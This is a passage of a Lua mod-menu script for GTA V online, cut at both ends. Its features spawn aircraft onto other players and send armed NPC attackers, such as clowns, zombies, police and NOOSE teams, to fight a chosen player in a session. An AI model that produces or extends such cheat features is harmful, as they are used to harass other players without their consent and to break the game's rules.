    	vehicle.set_vehicle_forward_speed(vehicle_, 200.0)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(1058115860)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Titan"] = menu.add_player_feature("Titan", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 700
    	utilities.request_model(0x616C97B9)
    	utilities.request_model(0x761E2AD3)
    	local vehicle_ = vehicle.create_vehicle(0x761E2AD3, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0x616C97B9, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0x616C97B9)
    	utilities.request_model(0x761E2AD3)    
    	local vehicle_ = vehicle.create_vehicle(0x761E2AD3, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0x616C97B9, pos + v3(0, 0, 10), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 200.0)
	end
	streaming.set_model_as_no_longer_needed(0x616C97B9)
	streaming.set_model_as_no_longer_needed(0x761E2AD3)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Blimp"] = menu.add_player_feature("Blimp", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 500
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(-150975354)
    	local vehicle_ = vehicle.create_vehicle(-150975354, pos + v3(math.random(-150, 150), math.random(-150, 150), 0), math.random(0, 360), true, false)
		local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-150, 150), math.random(-150, 150), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 20.0)
		local pos = entity.get_entity_coords(ped_)
		gameplay.shoot_single_bullet_between_coords(pos, pos + v3(0, 0, 0.1), 0, gameplay.get_hash_key("weapon_pistol"), player.get_player_ped(pid), false, true, 100)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(-150975354)
    	local vehicle_ = vehicle.create_vehicle(-150975354, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
		local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 10), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 20.0)
		local pos = entity.get_entity_coords(ped_)
		gameplay.shoot_single_bullet_between_coords(pos, pos + v3(0, 0, 0.1), 0, gameplay.get_hash_key("weapon_pistol"), player.get_player_ped(pid), false, true, 100)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(-150975354)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Miljet"] = menu.add_player_feature("Miljet", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 800
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(165154707)
    	local vehicle_ = vehicle.create_vehicle(165154707, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
		ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(165154707)
    	local vehicle_ = vehicle.create_vehicle(165154707, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 10), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(165154707)
	streaming.set_model_as_no_longer_needed(2563194959)
	streaming.set_model_as_no_longer_needed(919005580)
	streaming.set_model_as_no_longer_needed(1446741360)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Miljet Landing"] = menu.add_player_feature("Miljet Landing", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 800
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(165154707)
    	local vehicle_ = vehicle.create_vehicle(165154707, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)

		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_forward_speed(vehicle_, 60.0)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(165154707)
    	local vehicle_ = vehicle.create_vehicle(165154707, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 10), 1.0, true, false)

		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_forward_speed(vehicle_, 60.0)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(165154707)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Luxor"] = menu.add_player_feature("Luxor", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 800
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(621481054)
		local vehicle_ = vehicle.create_vehicle(621481054, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(621481054)
		local vehicle_ = vehicle.create_vehicle(621481054, pos + v3(0, 0, 10), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 10), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(621481054)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerparents["Trolling"] = menu.add_player_feature("Trolling", "parent", playerparents["AddictScript"].id)

playerparents["Send Attackers"]=menu.add_player_feature("Send Attackers","parent",playerparents["Trolling"].id)playerfeature["Spawn Killer Clowns"]=menu.add_player_feature("Spawn Killer Clowns","action",playerparents["Send Attackers"].id,function(a,b)local c=gameplay.get_hash_key("s_m_y_clown_01")local d=player.get_player_coords(b)d.x=d.x+math.random(-30,30)d.y=d.y+math.random(-30,30)streaming.request_model(c)while not streaming.has_model_loaded(c)do system.wait(0)end;for e=1,1 do local f=ped.create_ped(1,c,d,1.0,true,false)weapon.give_delayed_weapon_to_ped(f,0x78A97CD0,0,true)ped.set_ped_combat_ability(f,2)ped.set_ped_combat_attributes(f,5,true)ai.task_combat_ped(f,player.get_player_ped(b),1,16)gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(f),entity.get_entity_coords(f)+v3(0,0.0,0.1),0,453432689,player.get_player_ped(b),false,true,100)end end)playerfeature["Spawn Hungry Zombies"]=menu.add_player_feature("Spawn Hungry Zombies","action",playerparents["Send Attackers"].id,function(a,b)local c=gameplay.get_hash_key("u_m_y_zombie_01")local d=player.get_player_coords(b)d.x=d.x+math.random(-30,30)d.y=d.y+math.random(-30,30)streaming.request_model(c)while not streaming.has_model_loaded(c)do system.wait(0)end;for e=1,1 do local f=ped.create_ped(1,c,d,1.0,true,false)weapon.give_delayed_weapon_to_ped(f,0x47757124,0,true)ped.set_ped_combat_ability(f,2)ped.set_ped_combat_attributes(f,5,true)ai.task_combat_ped(f,player.get_player_ped(b),1,16)gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(f),entity.get_entity_coords(f)+v3(0,0.0,0.1),0,453432689,player.get_player_ped(b),false,true,100)end end)playerfeature["Send Police Patrol"]=menu.add_player_feature("Send Police Patrol","toggle",playerparents["Send Attackers"].id,function(g,b)while g.on do local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_f_y_cop_01")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Cops1+1;Cops1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops1>=8 then end;entity.set_entity_god_mode(Cops1[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x79FBB0C5;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#CopCar1+1;CopCar1[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(CopCar1[k],false)vehicle.set_vehicle_mod_kit_type(CopCar1[k],0)vehicle.get_vehicle_mod(CopCar1[k],40)vehicle.set_vehicle_mod(CopCar1[k],40,3,true)ped.set_ped_combat_attributes(Cops1[e],46,false)weapon.give_delayed_weapon_to_ped(Cops1[e],0x1B06D571,1,1)ped.set_ped_combat_attributes(Cops1[e],1,true)ped.set_ped_combat_attributes(Cops1[e],3,true)ped.set_ped_combat_attributes(Cops1[e],2,false)ped.set_ped_combat_attributes(Cops1[e],4,true)ped.set_ped_combat_range(Cops1[e],1)ped.set_ped_combat_ability(Cops1[e],2)ped.set_ped_combat_movement(Cops1[e],2)ped.set_ped_into_vehicle(Cops1[e],CopCar1[k],-1)ped.set_ped_max_health(Cops1[e],328.0)ped.set_ped_health(Cops1[e],328.0)ped.set_ped_config_flag(Cops1[e],187,0)ped.set_ped_can_ragdoll(Cops1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops1[e],l)end;local e=#Cops1+1;Cops1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops1>=8 then end;entity.set_entity_god_mode(Cops1[e],false)if entity.is_entity_dead(Cops1[e])then return HANDLER_CONTINUE end;streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Cops1[e],46,false)weapon.give_delayed_weapon_to_ped(Cops1[e],0x1B06D571,1,1)weapon.give_delayed_weapon_to_ped(Cops1[e],0x1D073A89,1,1)weapon.give_weapon_component_to_ped(Cops1[e],0x1D073A89,0x7BC4CDDC)ped.set_ped_combat_attributes(Cops1[e],1,true)ped.set_ped_combat_attributes(Cops1[e],3,true)ped.set_ped_combat_attributes(Cops1[e],2,false)ped.set_ped_combat_attributes(Cops1[e],52,false)ped.set_ped_combat_attributes(Cops1[e],4,true)ped.set_ped_combat_range(Cops1[e],1)ped.set_ped_combat_ability(Cops1[e],2)ped.set_ped_combat_movement(Cops1[e],2)ped.set_ped_max_health(Cops1[e],328.0)ped.set_ped_health(Cops1[e],328.0)ped.set_ped_config_flag(Cops1[e],187,0)ped.set_ped_can_ragdoll(Cops1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops1[e],l)end;ped.set_ped_into_vehicle(Cops1[e],CopCar1[k],0)while g.on do ai.task_combat_ped(Cops1[e],h,0,16)system.wait(25)if entity.is_entity_dead(Cops1[e])then return HANDLER_CONTINUE end;system.wait(25)for e=1,#Cops1 do system.wait(25)if utilities.get_distance_between(h,Cops1[e])>500 then network.request_control_of_entity(Cops1[e])entity.set_entity_as_no_longer_needed(Cops1[e])network.request_control_of_entity(CopCar1[k])entity.set_entity_as_no_longer_needed(CopCar1[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Cops1 do ped.get_all_peds(Cops1[e])system.wait(25)network.request_control_of_entity(Cops1[e])entity.set_entity_coords_no_offset(Cops1[e],d)entity.set_entity_as_no_longer_needed(Cops1[e])entity.delete_entity(Cops1[e])end;for k=1,#CopCar1 do vehicle.get_all_vehicles(CopCar1[k])system.wait(25)network.request_control_of_entity(CopCar1[k])entity.set_entity_coords_no_offset(CopCar1[k],d)entity.set_entity_as_no_longer_needed(CopCar1[k])entity.delete_entity(CopCar1[k])end end end)playerfeature["Send Highway Patrol Bikes"]=menu.add_player_feature("Send Highway Patrol Bikes","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_hwaycop_01")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Cops3+1;Cops3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops3>=8 then end;entity.set_entity_god_mode(Cops3[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xFDEFAEC3;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#CopBike+1;CopBike[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(CopBike[k],false)vehicle.set_vehicle_mod_kit_type(CopBike[k],0)vehicle.get_vehicle_mod(CopBike[k],40)vehicle.set_vehicle_mod(CopBike[k],40,3,true)ped.set_ped_combat_attributes(Cops3[e],46,false)weapon.give_delayed_weapon_to_ped(Cops3[e],0xCB96392F,1,1)weapon.give_weapon_component_to_ped(Cops3[e],0xCB96392F,0x10F42E8F)weapon.give_weapon_component_to_ped(Cops3[e],0xCB96392F,0x359B7AAE)weapon.give_weapon_component_to_ped(Cops3[e],0xCB96392F,0x27077CCB)ped.set_ped_combat_attributes(Cops3[e],1,true)ped.set_ped_combat_attributes(Cops3[e],3,true)ped.set_ped_combat_attributes(Cops3[e],2,false)ped.set_ped_combat_attributes(Cops3[e],4,true)ped.set_ped_combat_range(Cops3[e],1)ped.set_ped_combat_movement(Cops3[e],2)ped.set_ped_combat_ability(Cops3[e],2)ped.set_ped_max_health(Cops3[e],328.0)ped.set_ped_health(Cops3[e],328.0)ped.set_ped_config_flag(Cops3[e],187,0)ped.set_ped_can_ragdoll(Cops3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops3[e],l)end;ped.set_ped_into_vehicle(Cops3[e],CopBike[k],-1)if entity.is_entity_dead(Cops3[e])then return HANDLER_CONTINUE end;local e=#Cops3+1;Cops3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops3>=8 then end;entity.set_entity_god_mode(Cops3[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xFDEFAEC3;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#CopBike+1;CopBike[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(CopBike[k],false)vehicle.set_vehicle_mod_kit_type(CopBike[k],0)vehicle.get_vehicle_mod(CopBike[k],40)vehicle.set_vehicle_mod(CopBike[k],40,3,true)ped.set_ped_combat_attributes(Cops3[e],46,false)weapon.give_delayed_weapon_to_ped(Cops3[e],0xCB96392F,1,1)weapon.give_weapon_component_to_ped(Cops3[e],0xCB96392F,0x10F42E8F)weapon.give_weapon_component_to_ped(Cops3[e],0xCB96392F,0x359B7AAE)weapon.give_weapon_component_to_ped(Cops3[e],0xCB96392F,0x27077CCB)ped.set_ped_combat_attributes(Cops3[e],1,true)ped.set_ped_combat_attributes(Cops3[e],3,true)ped.set_ped_combat_attributes(Cops3[e],2,false)ped.set_ped_combat_attributes(Cops3[e],4,true)ped.set_ped_combat_range(Cops3[e],1)ped.set_ped_combat_movement(Cops3[e],2)ped.set_ped_combat_ability(Cops3[e],2)ped.set_ped_max_health(Cops3[e],328.0)ped.set_ped_health(Cops3[e],328.0)ped.set_ped_config_flag(Cops3[e],187,0)ped.set_ped_can_ragdoll(Cops3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops3[e],l)end;ped.set_ped_into_vehicle(Cops3[e],CopBike[k],-1)if entity.is_entity_dead(Cops3[e])then return HANDLER_CONTINUE end;while g.on do ai.task_combat_ped(Cops3[e],h,0,16)system.wait(25)if entity.is_entity_dead(Cops3[e])then return HANDLER_CONTINUE end;system.wait(25)for e=1,#Cops3 do system.wait(25)if utilities.get_distance_between(h,Cops3[e])>1000 then network.request_control_of_entity(Cops3[e])entity.set_entity_as_no_longer_needed(Cops3[e])network.request_control_of_entity(CopBike[k])entity.set_entity_as_no_longer_needed(CopBike[k])end end end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Cops3 do ped.get_all_peds(Cops3[e])system.wait(25)network.request_control_of_entity(Cops3[e])entity.set_entity_coords_no_offset(Cops3[e],d)entity.set_entity_as_no_longer_needed(Cops3[e])entity.delete_entity(Cops3[e])end;for k=1,#CopBike do vehicle.get_all_vehicles(CopBike[k])system.wait(25)network.request_control_of_entity(CopBike[k])entity.set_entity_coords_no_offset(CopBike[k],d)entity.set_entity_as_no_longer_needed(CopBike[k])entity.delete_entity(CopBike[k])end end)playerfeature["Send Police Tactical Team"]=menu.add_player_feature("Send Police Tactical Team","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_cop_01")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Cops4+1;Cops4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops4>=8 then end;entity.set_entity_god_mode(Cops4[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x1B38E955;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#CopVan+1;CopVan[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(CopVan[k],false)vehicle.set_vehicle_mod_kit_type(CopVan[k],0)vehicle.get_vehicle_mod(CopVan[k],40)vehicle.set_vehicle_mod(CopVan[k],40,3,true)ped.set_ped_combat_attributes(Cops4[e],46,false)weapon.give_delayed_weapon_to_ped(Cops4[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x1B06D571,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x2BE6766B,1,1)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x3CC6BA57)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x350966FB)ped.set_ped_combat_attributes(Cops4[e],1,true)ped.set_ped_combat_attributes(Cops4[e],3,true)ped.set_ped_prop_index(Cops4[e],0,0,0,0)ped.set_ped_combat_attributes(Cops4[e],2,false)ped.set_ped_combat_attributes(Cops4[e],52,false)ped.set_ped_combat_attributes(Cops4[e],4,true)ped.set_ped_combat_range(Cops4[e],2)ped.set_ped_combat_ability(Cops4[e],2)ped.set_ped_combat_movement(Cops4[e],1)ped.set_ped_max_health(Cops4[e],328.0)ped.set_ped_health(Cops4[e],328.0)ped.set_ped_config_flag(Cops4[e],187,0)ped.set_ped_can_ragdoll(Cops4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops4[e],l)end;ped.set_ped_into_vehicle(Cops4[e],CopVan[k],-1)local e=#Cops4+1;Cops4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops4>=8 then end;entity.set_entity_god_mode(Cops4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Cops4[e],46,false)weapon.give_delayed_weapon_to_ped(Cops4[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x1B06D571,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x2BE6766B,1,1)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x3CC6BA57)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x350966FB)ped.set_ped_combat_attributes(Cops4[e],1,true)ped.set_ped_combat_attributes(Cops4[e],3,true)ped.set_ped_prop_index(Cops4[e],0,0,0,0)ped.set_ped_combat_attributes(Cops4[e],2,false)ped.set_ped_combat_attributes(Cops4[e],52,false)ped.set_ped_combat_attributes(Cops4[e],4,true)ped.set_ped_combat_range(Cops4[e],2)ped.set_ped_combat_ability(Cops4[e],2)ped.set_ped_combat_movement(Cops4[e],1)ped.set_ped_max_health(Cops4[e],328.0)ped.set_ped_health(Cops4[e],328.0)ped.set_ped_config_flag(Cops4[e],187,0)ped.set_ped_can_ragdoll(Cops4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops4[e],l)end;ped.set_ped_into_vehicle(Cops4[e],CopVan[k],0)local e=#Cops4+1;Cops4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops4>=8 then end;entity.set_entity_god_mode(Cops4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Cops4[e],46,false)weapon.give_delayed_weapon_to_ped(Cops4[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x1B06D571,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x2BE6766B,1,1)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x3CC6BA57)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x350966FB)ped.set_ped_combat_attributes(Cops4[e],1,true)ped.set_ped_combat_attributes(Cops4[e],3,true)ped.set_ped_prop_index(Cops4[e],0,0,0,0)ped.set_ped_combat_attributes(Cops4[e],2,true)ped.set_ped_combat_attributes(Cops4[e],52,false)ped.set_ped_combat_attributes(Cops4[e],4,true)ped.set_ped_combat_range(Cops4[e],2)ped.set_ped_combat_ability(Cops4[e],2)ped.set_ped_combat_movement(Cops4[e],1)ped.set_ped_max_health(Cops4[e],328.0)ped.set_ped_health(Cops4[e],328.0)ped.set_ped_config_flag(Cops4[e],187,0)ped.set_ped_can_ragdoll(Cops4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops4[e],l)end;ped.set_ped_into_vehicle(Cops4[e],CopVan[k],1)local e=#Cops4+1;Cops4[e]=ped.create_ped(6,i,d,d.z,true,false)if#Cops4>=8 then end;entity.set_entity_god_mode(Cops4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Cops4[e],46,false)weapon.give_delayed_weapon_to_ped(Cops4[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x1B06D571,1,1)weapon.give_delayed_weapon_to_ped(Cops4[e],0x2BE6766B,1,1)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x3CC6BA57)weapon.give_weapon_component_to_ped(Cops4[e],0x2BE6766B,0x350966FB)ped.set_ped_combat_attributes(Cops4[e],1,true)ped.set_ped_combat_attributes(Cops4[e],3,true)ped.set_ped_prop_index(Cops4[e],0,0,0,0)ped.set_ped_combat_attributes(Cops4[e],2,true)ped.set_ped_combat_attributes(Cops4[e],52,false)ped.set_ped_combat_attributes(Cops4[e],4,true)ped.set_ped_combat_range(Cops4[e],2)ped.set_ped_combat_ability(Cops4[e],2)ped.set_ped_combat_movement(Cops4[e],1)ped.set_ped_max_health(Cops4[e],328.0)ped.set_ped_health(Cops4[e],328.0)ped.set_ped_config_flag(Cops4[e],187,0)ped.set_ped_can_ragdoll(Cops4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Cops4[e],l)end;ped.set_ped_into_vehicle(Cops4[e],CopVan[k],2)while g.on do ai.task_combat_ped(Cops4[e],h,0,16)system.wait(25)if entity.is_entity_dead(Cops4[e])then return HANDLER_CONTINUE end;for e=1,#Cops4 do system.wait(25)ai.task_combat_ped(Cops4[e],h,0,16)if utilities.get_distance_between(h,Cops4[e])>1000 then network.request_control_of_entity(Cops4[e])entity.set_entity_as_no_longer_needed(Cops4[e])network.request_control_of_entity(CopVan[k])entity.set_entity_as_no_longer_needed(CopVan[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Cops4 do ped.get_all_peds(Cops4[e])system.wait(25)network.request_control_of_entity(Cops4[e])entity.set_entity_coords_no_offset(Cops4[e],d)entity.set_entity_as_no_longer_needed(Cops4[e])entity.delete_entity(Cops4[e])end;for k=1,#CopVan do vehicle.get_all_vehicles(CopVan[k])system.wait(25)network.request_control_of_entity(CopVan[k])entity.set_entity_coords_no_offset(CopVan[k],d)entity.set_entity_as_no_longer_needed(CopVan[k])entity.delete_entity(CopVan[k])end end)playerfeature["Send Noose"]=menu.add_player_feature("Send Noose","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_swat_01")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#NooseTeam6+1;NooseTeam6[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam6>=8 then end;entity.set_entity_god_mode(NooseTeam6[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x432EA949;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#NooseCar2+1;NooseCar2[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(NooseCar2[k],false)vehicle.set_vehicle_mod_kit_type(NooseCar2[k],0)vehicle.get_vehicle_mod(NooseCar2[k],40)vehicle.set_vehicle_mod(NooseCar2[k],40,3,true)ped.set_ped_combat_attributes(NooseTeam6[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xA3D4D34,1,1)weapon.give_weapon_component_to_ped(NooseTeam6[e],0x2B5EF5EC,0x9307D6FA)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xC164F53)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xAA2C45B4)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x334A5203)ped.set_ped_combat_attributes(NooseTeam6[e],1,true)ped.set_ped_combat_attributes(NooseTeam6[e],3,true)ped.set_ped_prop_index(NooseTeam6[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam6[e],2,false)ped.set_ped_combat_attributes(NooseTeam6[e],52,false)ped.set_ped_combat_attributes(NooseTeam6[e],4,true)ped.set_ped_comb